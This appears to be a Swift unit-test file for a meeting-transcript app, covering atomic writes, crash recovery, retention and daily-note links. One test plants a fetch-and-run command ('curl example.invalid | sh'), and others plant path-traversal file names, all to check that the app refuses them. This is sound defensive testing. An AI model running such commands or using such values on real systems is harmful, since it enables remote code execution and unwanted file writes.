import XCTest
@testable import ListenMoreCore

/// Real files in a temporary folder (runs on Linux and macOS): incremental, atomic writes; recovery
/// after the app quits mid-call; retention; the daily-note line; vault detection. Synthetic text only.
final class TranscriptDurabilityTests: XCTestCase {
    var root: URL!
    var folder: URL!
    let utc = TranscriptFixture.utc
    let start = TranscriptFixture.start

    override func setUpWithError() throws {
        root = FileManager.default.temporaryDirectory.appendingPathComponent("lm-durable-\(UUID().uuidString)", isDirectory: true)
        folder = root.appendingPathComponent("Vault/Meetings", isDirectory: true)
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: root)
    }

    func recorder(_ store: TranscriptStore = FileTranscriptStore(), io: TranscriptIO = .inline) -> TranscriptRecorder {
        TranscriptRecorder(store: store, timeZone: utc, io: io, newCallId: TranscriptFixture.ids())
    }

    func names(_ dir: URL) throws -> [String] {
        try FileManager.default.contentsOfDirectory(atPath: dir.path).sorted()
    }

    func read(_ url: URL) throws -> String { try String(contentsOf: url, encoding: .utf8) }

    func spool(_ id: String = "call1") -> URL { CallSpool.url(callId: id, in: folder) }

    // MARK: incremental, atomic

    func testEachLineIsOnDiskAsSoonAsItArrives() throws {
        let r = recorder()
        r.begin(start: start, folder: folder, labels: SpeakerLabels(), info: CallInfo(title: "Sync"))
        let note = try XCTUnwrap(r.lastURL)
        XCTAssertTrue(try read(note).contains("transcript-status: in-progress"))
        for i in 1...3 {
            r.add(TranscriptLine(speaker: i % 2 == 0 ? .me : .others, offset: Double(i), text: "line \(i)"))
            XCTAssertTrue(try read(note).contains("line \(i) ^l\(i)"), "line \(i) is in the note")
            XCTAssertEqual(try read(spool()).split(separator: "\n").count, 2 + i, "and in the spool (after begin and the first-write record)")
        }
        XCTAssertEqual(try names(folder), [".meetingcard-call1.spool", "2026-01-31 0905 Sync.md"], "no temporary files left behind")
        let perms = try FileManager.default.attributesOfItem(atPath: note.path)[.posixPermissions] as? NSNumber
        XCTAssertEqual(perms?.intValue, 0o600)
        let spoolPerms = try FileManager.default.attributesOfItem(atPath: spool().path)[.posixPermissions] as? NSNumber
        XCTAssertEqual(spoolPerms?.intValue, 0o600)
        r.end()
        XCTAssertEqual(try names(folder), ["2026-01-31 0905 Sync.md"], "the spool goes when the note is final")
    }

    func testReplacingNeverFollowsASymlink() throws {
        let outside = root.appendingPathComponent("outside.md")
        try "outside".write(to: outside, atomically: false, encoding: .utf8)
        let link = folder.appendingPathComponent("link.md")
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: outside)
        let store = FileTranscriptStore()
        XCTAssertThrowsError(try store.append("x", to: link), "append refuses a symlink")
        try store.write("replaced", to: link)
        XCTAssertEqual(try read(outside), "outside", "the file outside the folder is untouched")
        XCTAssertEqual(try read(link), "replaced", "the link itself was replaced by a plain file")
    }

    func testTheBackgroundQueueWritesInOrderAndFlushes() throws {
        let r = recorder(io: .serial(label: "test.transcript"))
        r.begin(start: start, folder: folder, labels: SpeakerLabels())
        for i in 1...50 { r.add(TranscriptLine(speaker: .others, offset: Double(i), text: "n\(i)")) }
        r.flush()
        let note = try read(try XCTUnwrap(r.lastURL))
        XCTAssertTrue(note.contains("n50 ^l50"))
        let spoolLines = try read(spool()).split(separator: "\n")
        XCTAssertEqual(spoolLines.count, 52, "begin, the first-write record and 50 lines")
        XCTAssertTrue(spoolLines.last?.contains("\"x\":\"n50\"") == true, "in order")
        r.end()
        r.flush()
        XCTAssertTrue(try read(try XCTUnwrap(r.lastURL)).contains("transcript-status: complete"))
    }

    // MARK: recovery

    /// The app quits mid-call: the recorder is dropped without `end()`.
    func crashMidCall(editNote: Bool = false) throws -> URL {
        var r: TranscriptRecorder? = recorder()
        var labels = SpeakerLabels()
        r?.begin(start: start, folder: folder, labels: labels, info: CallInfo(title: "Sync", app: "Zoom"))
        r?.add(TranscriptLine(speaker: .me, offset: 2, text: "first"))
        r?.gap(.youMuted, open: true, at: 5)
        r?.add(TranscriptLine(speaker: .others, offset: 9, text: "second"))
        r?.cue("interrupt", at: 9.5)
        labels.rename(.others, to: "Guest")
        r?.relabel(labels)
        let note = try XCTUnwrap(r?.lastURL)
        r = nil
        // The last spool record made it; the note render after it didn't.
        let line = CallSpool.line(TranscriptLine(speaker: .others, offset: 12, text: "only in the spool")).encoded()
        try FileTranscriptStore().append(line, to: spool())
        // A crash mid-append leaves a torn line.
        try FileTranscriptStore().append("{\"k\":\"line\",\"t\":13,\"x\":\"tor", to: spool())
        if editNote { try FileTranscriptStore().write(try read(note) + "\nMy notes.\n", to: note) }
        return note
    }

    func testRecoveryFinishesTheNoteFromTheSpool() throws {
        let note = try crashMidCall()
        let written = TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc)
        XCTAssertEqual(written, [note])
        let md = try read(note)
        XCTAssertTrue(md.contains("transcript-status: recovered"))
        XCTAssertTrue(md.contains("end: 2026-01-31T09:05:19\n"), "ends at the last thing recorded")
        XCTAssertTrue(md.contains("**[00:00:02] You:** first ^l1"))
        XCTAssertTrue(md.contains("**[00:00:09] Guest:** second ^l2"), "the tag survives")
        XCTAssertTrue(md.contains("**[00:00:12] Guest:** only in the spool ^l3"), "nothing the spool had is lost")
        XCTAssertFalse(md.contains("^l4"), "the torn record is skipped")
        XCTAssertTrue(md.contains("*[00:00:05–00:00:12] Coach mic off: no You text.*"))
        XCTAssertTrue(md.contains("*[00:00:12–00:00:12] The app quit during the call"))
        XCTAssertTrue(md.contains("- [[#^l2|00:00:09]] Interruption"))
        XCTAssertTrue(md.contains("meeting-app: \"Zoom\""))
        XCTAssertFalse(try names(folder).contains { $0.hasSuffix(".spool") }, "the spool is removed")
        XCTAssertEqual(TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc), [], "once only")
    }

    func testRecoveryNeverOverwritesANoteEditedAfterTheCrash() throws {
        let note = try crashMidCall(editNote: true)
        let edited = try read(note)
        let written = TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc)
        XCTAssertEqual(try read(note), edited, "the user's note is untouched")
        XCTAssertEqual(written.map(\.lastPathComponent), ["2026-01-31 0905 Sync (2).md"])
        XCTAssertTrue(try read(written[0]).contains("only in the spool"))
    }

    func testANoteRemovedAfterTheCrashStaysRemoved() throws {
        let note = try crashMidCall()
        try FileManager.default.removeItem(at: note)
        XCTAssertEqual(TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc), [])
        XCTAssertEqual(try names(folder), [], "not recreated, and the spool is gone")
    }

    /// The note was edited, so the rest went to a note beside it, and the app quit before that note
    /// was first written: recovery writes it (nothing the spool had is lost).
    func testRecoveryWritesANoteThatNeverReachedDisk() throws {
        let note = try crashMidCall(editNote: true)
        let beside = folder.appendingPathComponent("2026-01-31 0905 Sync (2).md")
        try FileTranscriptStore().append(CallSpool.note(beside.lastPathComponent, t: 12).encoded(), to: spool())
        let written = TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc)
        XCTAssertEqual(written.map(\.lastPathComponent), [beside.lastPathComponent])
        XCTAssertTrue(try read(beside).contains("only in the spool"))
        XCTAssertTrue(try read(note).contains("My notes."), "the edited note is untouched")
    }

    func testRecoveryOfACallThatEndedJustRewritesItComplete() throws {
        let r = recorder()
        r.begin(start: start, folder: folder, labels: SpeakerLabels())
        r.add(TranscriptLine(speaker: .me, offset: 1, text: "one"))
        let note = try XCTUnwrap(r.lastURL)
        // The end record is synced; the app quit before the final render.
        try FileTranscriptStore().append(CallSpool.end(t: 30).encoded(), to: spool())
        XCTAssertEqual(TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc), [note])
        let md = try read(note)
        XCTAssertTrue(md.contains("transcript-status: complete"))
        XCTAssertTrue(md.contains("duration: \"00:00:30\""))
        XCTAssertFalse(md.contains("app quit"))
    }

    func testMaintenanceDuringACallLeavesThatCallAlone() throws {
        let crashed = try crashMidCall()
        let r = TranscriptRecorder(store: FileTranscriptStore(), timeZone: utc, io: .serial(label: "test.maintain"), newCallId: { "live1" })
        r.begin(start: start.addingTimeInterval(7200), folder: folder, labels: SpeakerLabels(), info: CallInfo(title: "Live"))
        r.add(TranscriptLine(speaker: .me, offset: 1, text: "live line"))
        r.maintain(folder: folder, retentionDays: 1, now: start.addingTimeInterval(86_400 * 30))
        r.add(TranscriptLine(speaker: .me, offset: 2, text: "after upkeep"))
        r.flush()
        XCTAssertTrue(try read(crashed).contains("transcript-status: recovered"), "the crashed call is finished")
        let live = try XCTUnwrap(r.lastURL)
        XCTAssertTrue(r.isSaving)
        let md = try read(live)
        XCTAssertTrue(md.contains("transcript-status: in-progress") && md.contains("after upkeep"), "the live call keeps going")
        XCTAssertTrue(FileManager.default.fileExists(atPath: CallSpool.url(callId: "live1", in: folder).path), "its spool is kept")
        r.end()
        r.flush()
        XCTAssertTrue(try read(live).contains("transcript-status: complete"))
    }

    // MARK: recovery never trusts the spool

    func writeSpool(_ id: String, _ lines: [String]) throws {
        try lines.joined().write(to: spool(id), atomically: false, encoding: .utf8)
    }

    /// This test's machine: one device and boot, and a running process 4242 that started at "t1".
    static let here = ProcessIdentity(device: "this-mac", boot: "boot-1", pid: getpid(),
                                      startTime: { $0 == 4242 ? "t1" : ($0 == getpid() ? "self" : nil) })

    func beginRecord(_ id: String, note: String, daily: String? = nil, device: String? = "this-mac", boot: String? = "boot-1",
                     pid: Int32? = nil, startTime: String? = nil) -> String {
        var b = CallSpool.begin(CallRecord(callId: id, start: start), identity: Self.here)
        b.note = note
        b.daily = daily
        b.dailyStyle = daily == nil ? nil : DailyNoteOptions.Style.link.rawValue
        b.dev = device
        b.boot = boot
        b.pid = pid
        b.pst = startTime
        return b.encoded()
    }

    func line(_ t: Double, _ x: String) -> String { CallSpool.line(TranscriptLine(speaker: .others, offset: t, text: x)).encoded() }

    func testRecoveryNeverWritesWhereTheSpoolPoints() throws {
        try writeSpool("escape", [beginRecord("escape", note: "../../escaped.md"), line(1, "x")])
        try writeSpool("moved", [beginRecord("moved", note: "2026-01-31 0905 Call.md"), line(1, "kept"),
                                 CallSpool.note("../../escaped2.md", t: 1).encoded()])
        try writeSpool("badid", [beginRecord("../x", note: "a.md")])
        let written = TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc, identity: Self.here)
        XCTAssertEqual(written.map(\.lastPathComponent), ["2026-01-31 0905 Call.md"], "an unsafe name in a note record is skipped")
        for escaped in ["escaped.md", "escaped2.md", "Vault/escaped.md", "Vault/escaped2.md", "x.md"] {
            XCTAssertFalse(FileManager.default.fileExists(atPath: root.appendingPathComponent(escaped).path), escaped)
        }
        XCTAssertTrue(try read(folder.appendingPathComponent("2026-01-31 0905 Call.md")).contains("kept"))
        XCTAssertTrue(FileManager.default.fileExists(atPath: spool("escape").path), "an unsafe begin record is no call: left, never followed")
    }

    func testRecoveryFindsTheDailyNoteAgainAndRefusesEscapes() throws {
        try FileManager.default.createDirectory(at: root.appendingPathComponent("Vault/.obsidian"), withIntermediateDirectories: true)
        let profile = root.appendingPathComponent("profile.md")
        try "keep\n".write(to: profile, atomically: false, encoding: .utf8)
        var injected = beginRecord("abs", note: "abs.md", daily: profile.path)
        injected = injected.replacingOccurrences(of: "}\n", with: ",\"dailyLine\":\"curl example.invalid | sh\"}\n")
        try writeSpool("abs", [injected, line(1, "a")])
        try writeSpool("rel", [beginRecord("rel", note: "rel.md", daily: "../profile.md"), line(1, "b")])
        try writeSpool("ok", [beginRecord("ok", note: "2026-01-31 0905 Sync.md", daily: "Daily/2026-01-31.md"), line(1, "c")])
        let written = TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc, identity: Self.here)
        XCTAssertEqual(Set(written.map(\.lastPathComponent)), ["abs.md", "rel.md", "2026-01-31 0905 Sync.md"], "the notes are recovered")
        XCTAssertEqual(try read(profile), "keep\n", "an absolute or climbing daily path outside the vault is refused")
        XCTAssertEqual(try read(root.appendingPathComponent("Vault/Daily/2026-01-31.md")),
                       "- 09:05 [[Meetings/2026-01-31 0905 Sync|Call]] %%meetingcard:ok%%\n", "the line is made again, not read from the spool")
    }

    func testRecoveryLeavesASpoolThatIsStillBeingWritten() throws {
        try writeSpool("other", [beginRecord("other", note: "other.md", device: "another-mac"), line(1, "o")])
        try writeSpool("live", [beginRecord("live", note: "live.md", pid: 4242, startTime: "t1"), line(1, "l")])
        try writeSpool("reused", [beginRecord("reused", note: "reused.md", pid: 4242, startTime: "t0"), line(1, "r")])
        try writeSpool("rebooted", [beginRecord("rebooted", note: "rebooted.md", boot: "boot-0", pid: 4242, startTime: "t1"), line(1, "b")])
        try writeSpool("gone", [beginRecord("gone", note: "gone.md", pid: 4343, startTime: "t1"), line(1, "g")])
        try writeSpool("old", [beginRecord("old", note: "old.md", boot: nil, pid: 4242), line(1, "x")])
        var written = TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc, identity: Self.here)
        XCTAssertEqual(Set(written.map(\.lastPathComponent)), ["reused.md", "rebooted.md", "gone.md"],
                       "a reused PID, a reboot and a process that's gone are crashes")
        XCTAssertEqual(TranscriptMaintenance.unfinished(folder: folder, store: FileTranscriptStore()), 3,
                       "another device's fresh spool, the live one, and one without a start time whose PID runs")
        try FileManager.default.setAttributes([.modificationDate: Date(timeIntervalSinceNow: -7 * 3600)], ofItemAtPath: spool("other").path)
        written = TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc, identity: Self.here)
        XCTAssertEqual(written.map(\.lastPathComponent), ["other.md"], "idle for hours: that device isn't coming back for it")
        XCTAssertTrue(FileManager.default.fileExists(atPath: spool("live").path))
    }

    /// Without a device ID on either side, a spool from another boot may be another machine's live
    /// call: it waits the same six idle hours. With both IDs and a different boot, it's this machine's crash.
    func testAMissingDeviceIdWithAnotherBootWaitsUntilIdle() throws {
        let noDevice = ProcessIdentity(device: nil, boot: "boot-1", pid: getpid(), startTime: Self.here.startTime)
        try writeSpool("a", [beginRecord("a", note: "a.md", device: nil, boot: "boot-0", pid: 4343, startTime: "t1"), line(1, "a")])
        try writeSpool("b", [beginRecord("b", note: "b.md", device: "other-mac", boot: "boot-0", pid: 4343, startTime: "t1"), line(1, "b")])
        try writeSpool("c", [beginRecord("c", note: "c.md", device: nil, pid: 4343, startTime: "t1"), line(1, "c")])
        try writeSpool("d", [beginRecord("d", note: "d.md", device: "this-mac", boot: "boot-0", pid: 4343, startTime: "t1"), line(1, "d")])
        func recover(_ identity: ProcessIdentity) -> Set<String> {
            Set(TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc, identity: identity).map(\.lastPathComponent))
        }
        XCTAssertEqual(recover(noDevice), ["c.md"],
                       "no device ID here: another boot may be another machine (a, b, d wait); the same boot with its writer gone is a crash (c)")
        XCTAssertEqual(recover(Self.here), ["d.md"],
                       "both IDs known and equal, another boot: this machine's crash (d); the spool without one (a) still waits")
        for id in ["a", "b"] {
            try FileManager.default.setAttributes([.modificationDate: Date(timeIntervalSinceNow: -7 * 3600)], ofItemAtPath: spool(id).path)
        }
        XCTAssertEqual(recover(noDevice), ["a.md", "b.md"], "idle for hours: recovered either way")
    }

    /// A crash while claiming the name on FAT or exFAT leaves an empty note: recovery writes into it.
    func testRecoveryReusesAnEmptyPlaceholder() throws {
        try writeSpool("ph", [beginRecord("ph", note: "p.md"), line(1, "kept")])
        try Data().write(to: folder.appendingPathComponent("p.md"))
        XCTAssertEqual(TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc, identity: Self.here)
            .map(\.lastPathComponent), ["p.md"])
        XCTAssertTrue(try read(folder.appendingPathComponent("p.md")).contains("kept"))
        XCTAssertEqual(try names(folder), ["p.md"], "nothing beside it")
        // Once the note had reached disk, an empty file is the user's doing: never written over.
        try writeSpool("emptied", [beginRecord("emptied", note: "e.md"), CallSpool.written("e.md").encoded(), line(1, "x")])
        try Data().write(to: folder.appendingPathComponent("e.md"))
        XCTAssertEqual(TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc, identity: Self.here)
            .map(\.lastPathComponent), ["e (2).md"])
        XCTAssertEqual(try Data(contentsOf: folder.appendingPathComponent("e.md")), Data())
    }

    func testUpkeepReportsWhatItHadToLeave() throws {
        try writeSpool("other", [beginRecord("other", note: "other.md", device: "another-mac"), line(1, "o")])
        let r = TranscriptRecorder(store: FileTranscriptStore(), timeZone: utc, identity: Self.here)
        var left: Int?
        r.maintain(folder: folder, retentionDays: nil) { left = $0 }
        XCTAssertEqual(left, 1)
    }

    func testThisMachinesIdentity() throws {
        let me = ProcessIdentity.current
        XCTAssertNotNil(me.startTime(me.pid), "this process has a start time")
        XCTAssertEqual(me.startTime(me.pid), me.startTime(me.pid), "and it's stable")
        XCTAssertNil(me.startTime(Int32.max - 1), "no such process")
        if let device = me.device {
            XCTAssertEqual(device.count, 16)
            XCTAssertTrue(device.allSatisfy(\.isHexDigit), "a hash, never the machine's own ID or name")
            XCTAssertEqual(ProcessIdentity.machineDevice(), device, "stable")
        }
        #if os(Linux) || os(macOS)
        XCTAssertNotNil(me.boot)
        #endif
    }

    /// Forwards to the real store, but someone else's file appears at the first name just before the note is created.
    final class RacingStore: TranscriptStore {
        let inner = FileTranscriptStore()
        var raced = false
        func prepare(folder: URL) throws { try inner.prepare(folder: folder) }
        func exists(_ url: URL) -> Bool { inner.exists(url) }
        func write(_ text: String, to url: URL) throws { try inner.write(text, to: url) }
        func create(_ text: String, at url: URL) throws {
            if !raced {
                raced = true
                try "someone else's".write(to: url, atomically: false, encoding: .utf8)
            }
            try inner.create(text, at: url)
        }
        func remove(_ url: URL) throws { try inner.remove(url) }
        func append(_ text: String, to url: URL) throws { try inner.append(text, to: url) }
        func read(_ url: URL) -> String? { inner.read(url) }
        func head(_ url: URL, bytes: Int) -> String? { inner.head(url, bytes: bytes) }
        func contents(of folder: URL) -> [URL] { inner.contents(of: folder) }
        func modified(_ url: URL) -> Date? { inner.modified(url) }
        func isDirectory(_ url: URL) -> Bool { inner.isDirectory(url) }
    }

    func testANotesFirstWriteNeverReplacesAFile() throws {
        let existing = folder.appendingPathComponent("taken.md")
        try "theirs".write(to: existing, atomically: false, encoding: .utf8)
        XCTAssertThrowsError(try FileTranscriptStore().create("mine", at: existing)) { XCTAssertEqual($0 as? TranscriptStoreError, .exists) }
        XCTAssertEqual(try read(existing), "theirs")
        XCTAssertEqual(try names(folder), ["taken.md"], "no temporary file left")

        let r = recorder(RacingStore())
        r.begin(start: start, folder: folder, labels: SpeakerLabels(), info: CallInfo(title: "Sync"))
        r.add(TranscriptLine(speaker: .me, offset: 1, text: "one"))
        XCTAssertEqual(try read(folder.appendingPathComponent("2026-01-31 0905 Sync.md")), "someone else's")
        XCTAssertEqual(r.lastURL?.lastPathComponent, "2026-01-31 0905 Sync (2).md")
        XCTAssertTrue(try read(folder.appendingPathComponent("2026-01-31 0905 Sync (2).md")).contains("one ^l1"))
        r.end()
        XCTAssertEqual(TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc), [])
    }

    func testANoteThatCantBeReadCountsAsEdited() throws {
        let r = recorder()
        r.begin(start: start, folder: folder, labels: SpeakerLabels(), info: CallInfo(title: "Sync"))
        let note = try XCTUnwrap(r.lastURL)
        let bytes = Data([0xFF, 0xFE, 0x00, 0x41])
        try bytes.write(to: note)
        r.add(TranscriptLine(speaker: .me, offset: 1, text: "one"))
        XCTAssertEqual(try Data(contentsOf: note), bytes, "never written over")
        XCTAssertEqual(r.lastURL?.lastPathComponent, "2026-01-31 0905 Sync (2).md")
        r.end()
    }

    func testALongJapaneseTitleIsStillSaved() throws {
        let r = recorder()
        r.begin(start: start, folder: folder, labels: SpeakerLabels(), info: CallInfo(title: String(repeating: "会議", count: 60)))
        r.add(TranscriptLine(speaker: .me, offset: 1, text: "one"))
        r.end()
        XCTAssertEqual(r.state, .saved(try XCTUnwrap(r.lastURL)))
        let name = try XCTUnwrap(r.lastURL?.lastPathComponent)
        XCTAssertLessThanOrEqual(name.utf8.count, NoteFileName.maxBytes + 3)
        XCTAssertTrue(try read(folder.appendingPathComponent(name)).contains("transcript-status: complete"))
    }

    func testTheQuitWaitIsBounded() {
        let io = TranscriptIO.serial(label: "test.bounded")
        io.run { Thread.sleep(forTimeInterval: 0.5) }
        XCTAssertFalse(io.waitUpTo(0.05), "still busy")
        XCTAssertTrue(io.waitUpTo(5))
    }

    func testRecoveryClearsOldTemporaryFilesAndEmptySpools() throws {
        let temp = folder.appendingPathComponent(".x.md.123\(FileTranscriptStore.tempSuffix)")
        try "partial".write(to: temp, atomically: false, encoding: .utf8)
        try FileManager.default.setAttributes([.modificationDate: Date(timeIntervalSinceNow: -7200)], ofItemAtPath: temp.path)
        let junk = spool("junk")
        try "not json\n".write(to: junk, atomically: false, encoding: .utf8)
        try FileManager.default.setAttributes([.modificationDate: Date(timeIntervalSinceNow: -200_000)], ofItemAtPath: junk.path)
        TranscriptMaintenance.recover(folder: folder, store: FileTranscriptStore(), timeZone: utc)
        XCTAssertEqual(try names(folder), [])
    }

    // MARK: retention

    func testRetentionRemovesOnlyOldUneditedNotesThisAppWrote() throws {
        let store = FileTranscriptStore()
        /// A note whose call started `daysAgo` and ended a minute later; its file last changed
        /// `changedAfterLastWrite` after MeetingCard's last write (the end, or `recoveredAfter` the start).
        func note(_ name: String, daysAgo: Double, ours: Bool = true, ended: Bool = true, recoveredAfter: TimeInterval? = nil,
                  changedAfterLastWrite: TimeInterval = 0, touchedDaysAgo: Double? = nil) throws -> URL {
            let url = folder.appendingPathComponent(name)
            let start = Date(timeIntervalSinceNow: -daysAgo * 86_400)
            var r = CallRecord(callId: "c\(abs(name.hashValue) % 100_000)", start: start)
            if ended { r.end = 60 }
            let recoveredAt = recoveredAfter.map { start.addingTimeInterval($0) }
            let text = ours ? CallNote.render(r, labels: SpeakerLabels(), status: recoveredAt == nil ? .complete : .recovered,
                                              timeZone: utc, recoveredAt: recoveredAt)
                : "---\nstart: 2020-01-01T00:00:00\n---\nmine\n"
            try store.write(text, to: url)
            let lastWrite = recoveredAt ?? start.addingTimeInterval(60)
            let touched = touchedDaysAgo.map { Date(timeIntervalSinceNow: -$0 * 86_400) } ?? lastWrite.addingTimeInterval(changedAfterLastWrite)
            try FileManager.default.setAttributes([.modificationDate: touched], ofItemAtPath: url.path)
            return url
        }
        let old = try note("2025-12-01 0900 old.md", daysAgo: 40)
        let recent = try note("2026-01-01 0900 recent.md", daysAgo: 5)
        let editedSameDay = try note("2025-12-01 1000 summary added.md", daysAgo: 40, changedAfterLastWrite: 3600)
        let editedSinceCutoff = try note("2025-12-01 1100 edited.md", daysAgo: 40, touchedDaysAgo: 1)
        let recoveredOld = try note("2025-12-01 1200 recovered.md", daysAgo: 40, recoveredAfter: 86_400)
        let recoveredEdited = try note("2025-12-01 1300 recovered edited.md", daysAgo: 40, recoveredAfter: 86_400,
                                       changedAfterLastWrite: 7200)
        let inProgress = try note("2025-12-01 1400 never finished.md", daysAgo: 40, ended: false)
        let foreign = try note("2020-01-01 0000 foreign.md", daysAgo: 400, ours: false)
        let otherName = try note("old copy.md", daysAgo: 40)
        let current = try note("2025-12-01 1500 current.md", daysAgo: 40)
        let sub = folder.appendingPathComponent("Sub", isDirectory: true)
        try FileManager.default.createDirectory(at: sub, withIntermediateDirectories: true)
        let viaLink = root.appendingPathComponent("Link", isDirectory: true)
        try FileManager.default.createSymbolicLink(at: viaLink, withDestinationURL: root.appendingPathComponent("Vault"))
        let currentByOtherPath = viaLink.appendingPathComponent("Meetings/\(current.lastPathComponent)")
        let removed = TranscriptMaintenance.prune(folder: folder, store: store, olderThanDays: 30, keep: [currentByOtherPath])
        XCTAssertEqual(Set(removed.map(\.lastPathComponent)), [old.lastPathComponent, recoveredOld.lastPathComponent])
        for kept in [recent, editedSameDay, editedSinceCutoff, recoveredEdited, inProgress, foreign, otherName, current, sub] {
            XCTAssertTrue(store.exists(kept), kept.lastPathComponent)
        }
        XCTAssertEqual(TranscriptMaintenance.prune(folder: folder, store: store, olderThanDays: 0), [], "0: off")
    }

    /// The reviewer's case: a summary written an hour after the call, the note now 40 days old.
    func testANoteEditedTheDayOfItsCallIsKept() throws {
        let r = recorder()
        let start = Date(timeIntervalSinceNow: -40 * 86_400)
        r.begin(start: start, folder: folder, labels: SpeakerLabels(), info: CallInfo(title: "Sync"))
        r.add(TranscriptLine(speaker: .me, offset: 1, text: "one"))
        r.end(at: 60)
        let note = try XCTUnwrap(r.lastURL)
        try FileTranscriptStore().write(try read(note).replacingOccurrences(of: "_Summary placeholder: add yours after the call._",
                                                                              with: "We agreed on the plan."), to: note)
        try FileManager.default.setAttributes([.modificationDate: start.addingTimeInterval(3660)], ofItemAtPath: note.path)
        XCTAssertEqual(TranscriptMaintenance.prune(folder: folder, store: FileTranscriptStore(), olderThanDays: 30), [])
        XCTAssertTrue(try read(note).contains("We agreed on the plan."))
        try FileManager.default.setAttributes([.modificationDate: start.addingTimeInterval(61)], ofItemAtPath: note.path)
        XCTAssertEqual(TranscriptMaintenance.prune(folder: folder, store: FileTranscriptStore(), olderThanDays: 30)
                        .map(\.lastPathComponent), [note.lastPathComponent], "unchanged since the call: removed")
    }

    /// `meetingcard-saved` is seconds since 1970, so a time zone change (travel, or two Macs in two
    /// zones sharing a vault) can't make an edited note look untouched.
    func testRetentionIsTheSameInEveryTimeZone() throws {
        let london = TimeZone(identifier: "Europe/London")!, newYork = TimeZone(identifier: "America/New_York")!
        let saved = NSTimeZone.default
        defer { NSTimeZone.default = saved }
        for (written, pruned) in [(london, newYork), (newYork, london)] {
            try? FileManager.default.removeItem(at: folder)
            try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
            NSTimeZone.default = written
            let start = Date(timeIntervalSinceNow: -40 * 86_400)
            var r = CallRecord(callId: "tz", start: start)
            r.end = 60
            let text = CallNote.render(r, labels: SpeakerLabels(), status: .complete, timeZone: written)
            let edited = folder.appendingPathComponent(NoteFileName.base(pattern: NoteFileName.defaultPattern, start: start,
                                                                        info: CallInfo(title: "edited"), timeZone: written) + ".md")
            let untouched = folder.appendingPathComponent(NoteFileName.base(pattern: NoteFileName.defaultPattern, start: start,
                                                                           info: CallInfo(title: "untouched"), timeZone: written) + ".md")
            for url in [edited, untouched] { try FileTranscriptStore().write(text, to: url) }
            try FileManager.default.setAttributes([.modificationDate: start.addingTimeInterval(60 + 3600)], ofItemAtPath: edited.path)
            try FileManager.default.setAttributes([.modificationDate: start.addingTimeInterval(61)], ofItemAtPath: untouched.path)
            NSTimeZone.default = pruned
            let removed = TranscriptMaintenance.prune(folder: folder, store: FileTranscriptStore(), olderThanDays: 30)
            XCTAssertEqual(removed.map(\.lastPathComponent), [untouched.lastPathComponent], "\(written.identifier) → \(pruned.identifier)")
            XCTAssertTrue(FileManager.default.fileExists(atPath: edited.path), "edited an hour after the call: kept")
        }
    }

    // MARK: daily note

    func testDailyNoteAppendIsIdempotentAndKeepsExistingText() throws {
        let store = FileTranscriptStore()
        let daily = root.appendingPathComponent("Vault/Daily/2026-01-31.md")
        try FileManager.default.createDirectory(at: daily.deletingLastPathComponent(), withIntermediateDirectories: true)
        let existing = "# Saturday\n\n- [ ] a task without a newline at the end"
        try existing.write(to: daily, atomically: false, encoding: .utf8)
        let mark = DailyNote.marker(callId: "call1")
        XCTAssertTrue(try DailyNote.append("- 09:05 [[x|Sync]] \(mark)", marker: mark, to: daily, store: store))
        XCTAssertFalse(try DailyNote.append("- 09:05 [[x|Sync]] \(mark)", marker: mark, to: daily, store: store), "twice: once")
        let text = try read(daily)
        XCTAssertTrue(text.hasPrefix(existing), "existing text is untouched, byte for byte")
        XCTAssertEqual(text, existing + "\n- 09:05 [[x|Sync]] \(mark)\n")
        XCTAssertTrue(try DailyNote.append("- line two %%meetingcard:call2%%", marker: DailyNote.marker(callId: "call2"), to: daily, store: store))
        XCTAssertTrue(try read(daily).hasSuffix("\(mark)\n- line two %%meetingcard:call2%%\n"))
    }

    func testDailyNoteIsCreatedWhenMissing() throws {
        let daily = root.appendingPathComponent("Vault/Daily/new.md")
        XCTAssertTrue(try DailyNote.append("- l %%m%%", marker: "%%m%%", to: daily, store: FileTranscriptStore()))
        XCTAssertEqual(try read(daily), "- l %%m%%\n")
    }

    func testTheRecorderLinksTheCallFromTheVaultsDailyNote() throws {
        try FileManager.default.createDirectory(at: root.appendingPathComponent("Vault/.obsidian"), withIntermediateDirectories: true)
        let r = recorder()
        let options = NoteOptions(dailyNote: DailyNoteOptions())
        r.begin(start: start, folder: folder, labels: SpeakerLabels(), info: CallInfo(title: "Sync"), options: options)
        r.end()
        let daily = root.appendingPathComponent("Vault/Daily/2026-01-31.md")
        XCTAssertEqual(try read(daily), "- 09:05 [[Meetings/2026-01-31 0905 Sync|Sync]] %%meetingcard:call1%%\n")
        r.begin(start: start.addingTimeInterval(3600), folder: folder, labels: SpeakerLabels(), options: NoteOptions(dailyNote: DailyNoteOptions(style: .embed)))
        r.end()
        XCTAssertTrue(try read(daily).hasSuffix("\n![[Meetings/2026-01-31 1005 Call]] %%meetingcard:call2%%\n"))
        XCTAssertTrue(try r.deleteCurrentOrLast())
        XCTAssertTrue(try read(daily).contains("call2"), "append only: Delete leaves the daily note alone")
    }

    func testRecoveryAddsTheDailyLineOnce() throws {
        let r0 = TranscriptRecorder(store: FileTranscriptStore(), timeZone: utc, newCallId: { "call9" })
        r0.begin(start: start, folder: folder, labels: SpeakerLabels(), options: NoteOptions(dailyNote: DailyNoteOptions(pathPattern: "Day {date}")))
        let daily = folder.appendingPathComponent("Day 2026-01-31.md")
